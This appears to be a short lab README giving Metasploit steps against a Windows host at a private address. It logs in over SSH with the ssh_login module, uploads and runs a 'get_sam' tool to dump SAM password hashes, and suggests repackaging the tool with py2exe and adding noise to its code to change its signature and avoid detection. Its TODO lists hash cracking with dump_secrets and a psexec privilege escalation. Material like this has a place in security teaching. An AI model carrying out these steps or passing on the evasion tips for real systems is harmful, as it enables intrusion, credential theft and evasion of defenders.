# Steps

``` sh
sudo msfconsole
# this is a contrived stand-in for some exploit that has already obtained a shell
use scanner/ssh/ssh_login
set USERNAME user
set PASSWORD ece
set RHOSTS 10.0.2.4
run # should connect. Use whatever method to get a shell that's suitable for you. Type 'sessions' to see your shell session
irb
n = 1 # for session 1
# Possible variation: maybe python isn't allowed to run over ssh, so you'd upload a zipped executable, such as one made by `py2exe` and then extract + run it.
framework.sessions[n].cmd_upload("/path/to/get_sam", "%userprofile%/Desktop/get_sam")
framework.sessions[n].shell_cmd("%userprofile%/Desktop/get_sam") # maybe tweak get_sam to print the hashes or export to a file we can download\
```

If your target doesn't have python installed, you can create an executable with access to a Windows machine:
```
> python.exe setup.py py2exe -b 0
```
**Note** you may also need to package VCRUNTIMExxx.dll. It's possible the setup.py script could be tweaked to borrow your system's VCRUNTIME DLL. Maybe setup.py could also inject noisy functions into get_sam.py prior to compilation to change the executable's signature and avoid detection.

Alternatively you could upload a python distribution, but that's massive.

## TODO:
1. retrieve target hashes
2. run dump_secrets on those hashes
3. run psexec exploit for privilege escalation